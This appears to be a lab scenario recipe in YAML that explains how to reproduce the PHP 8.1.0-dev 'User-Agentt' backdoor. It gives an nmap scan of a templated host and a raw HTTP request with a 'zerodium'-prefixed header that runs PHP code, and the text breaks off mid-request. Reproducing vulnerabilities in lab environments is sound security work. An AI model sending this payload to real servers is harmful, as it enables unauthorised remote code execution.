access_instructions:
  title: PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 8080. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:8080`.
  - title: Vulnerability Reproduce
    instructions: |-
      Send the following request to execute the code `var_dump(233*233);`:

      ```
      GET / HTTP/1.1
      Host: {{NODE_IP}}:8080
      Accept-Encoding: gzip, deflate
      Accept: */*
      Accept-Language: en
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
      User-Agentt: zerodiumvar_dump(233*233);
